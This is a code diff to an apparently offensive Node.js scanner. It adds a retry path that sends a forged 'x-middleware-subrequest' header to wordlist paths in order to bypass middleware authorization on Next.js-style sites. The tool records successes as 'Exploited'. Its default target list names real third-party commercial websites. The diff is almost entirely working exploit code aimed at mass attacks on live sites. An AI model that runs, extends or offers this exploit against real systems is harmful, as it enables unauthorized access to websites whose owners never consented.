@@ -44,7 +44,12 @@ const argv = yargs
     alias: 'headless',
     description: 'If the t flag or headless flag is set, it will launch a headless puppeteer.',
     default: false
-  }).help('help').alias('h', 'help').argv;
+  })
+  .option('x', {
+    alias: 'headers',
+    description: 'It will try with middleware:middleware:middleware:middleware:middleware first; in case it fails. It will retry with src/middleware:src/middleware:src/middleware:src/middleware:src/middleware'
+  })
+  .help('help').alias('h', 'help').argv;
 
 const WEBSITES = argv.u ? argv.u.split(/[\s,]+/).map(url => url.trim()) : argv.f ? fs.readFileSync(argv.f, 'utf8').split('\n').map(url => url.trim()).filter(Boolean) : [
   'https://www.boxeurdesrues.com', 'https://www.sportsshoes.com/',
@@ -167,9 +172,33 @@ async function checkWebsites() {
             exploitedSites.push(exploitUrl);
             info[hostname].result = 'Exploited';
             info[hostname].exploitedUrls.push(exploitUrl)
+            info[hostname].headers = `x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware`
           }
         } catch (e) {
           info[hostname].errors.push({message: e.message, code: e.code, info: `Error attacking`})
+        }
+      }
+      if (info[hostname].result != 'Exploited' && argv.x) {
+        for (let i = 0; i < wordlist.length; i++) {
+          let exploitUrl = url.endsWith('/') ? `${url}${wordlist[i]}` : `${url}/${wordlist[i]}`;
+          try {
+            let response = await fetch(exploitUrl, {
+              'method': 'GET',
+              headers: {
+                'x-middleware-subrequest': 'src/middleware:src/middleware:src/middleware:src/middleware:src/middleware'
+              },
+              redirect: argv.r ? 'follow' : 'manual',
+              keepalive: false
+            });
+            if (response.status == 200){
+              exploitedSites.push(exploitUrl);
+              info[hostname].result = 'Exploited';
+              info[hostname].exploitedUrls.push(exploitUrl);
+              info[hostname].headers = `x-middleware-subrequest: src/middleware:src/middleware:src/middleware:src/middleware:src/middleware`
+            }
+          } catch (e) {
+            info[hostname].errors.push({message: e.message, code: e.code, info: `Error attacking`})
+          }
         }
       }
     });
